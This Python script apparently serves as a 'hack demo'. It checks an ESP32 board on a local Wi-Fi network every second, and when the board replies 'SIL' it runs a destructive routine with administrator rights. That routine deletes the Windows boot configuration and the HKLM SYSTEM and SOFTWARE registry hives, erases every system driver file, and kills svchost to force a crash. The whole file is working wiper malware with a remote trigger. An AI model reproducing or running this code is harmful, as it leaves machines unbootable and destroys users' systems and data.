import requests
import os
import time
import ctypes

# ============================================================
# SETTINGS
# ============================================================
# ESP32 in AP mode typically defaults to IP 192.168.4.1
ESP32_IP  = "192.168.4.1"            
ESP32_URL = f"http://{ESP32_IP}/durum"

CHECK_INTERVAL = 1
# ============================================================

def total_destruction():
    print("\n" + "!"*50)
    print("SIGNAL RECEIVED: SYSTEM IS BEING DESTROYED...")
    print("!"*50)
    
    # 1. Delete Boot Data (BCD) - Shows "Operating System Not Found" on startup.
    print("[*] Destroying boot configuration...")
    os.system("bcdedit /deleteall")
    
    # 2. Delete Registry (Registry) - Wipes Windows' brain.
    print("[*] Deleting registry keys...")
    os.system(r'reg delete "HKEY_LOCAL_MACHINE\SYSTEM" /f')
    os.system(r'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE" /f')
    
    # 3. Clean Critical Drivers
    print("[*] Removing system drivers...")
    os.system(r"del /f /s /q C:\Windows\System32\drivers\*.sys")

    # 4. Final Strike: Crash system and shutdown
    print("[*] Terminating critical process...")
    # This command kills svchost with admin rights and triggers BSOD (Blue Screen).
    os.system("taskkill /f /im svchost.exe")

def main():
    # Admin check to avoid WinError 5
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("=" * 50)
        print("[ERROR] PLEASE RUN THIS CODE AS 'ADMINISTRATOR'!")
        print("=" * 50)
        return

    print("=" * 50)
    print("  ESP32-C6 — AP MODE (WIFI) SYSTEM LISTENER")
    print("=" * 50)
    print(f"ESP32 Target : {ESP32_URL}")
    print("[TIP] Make sure your computer is connected to the HACK_DEMO network.")
    print("\n[READY] Waiting for signal... System is currently safe.\n")

    while True:
        try:
            response = requests.get(ESP32_URL, timeout=2)
            status = response.text.strip().upper()

            if status == "SIL":
                total_destruction()
                break
            else:
                print(f"[...] Listening... ESP32 Response: '{status}'", end="\r")

        except requests.exceptions.ConnectionError:
            print("[!] Cannot connect to ESP32 — check your Wi-Fi connection!", end="\r")
        except Exception as e:
            print(f"[!] Error occurred: {e}                                     ", end="\r")

        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
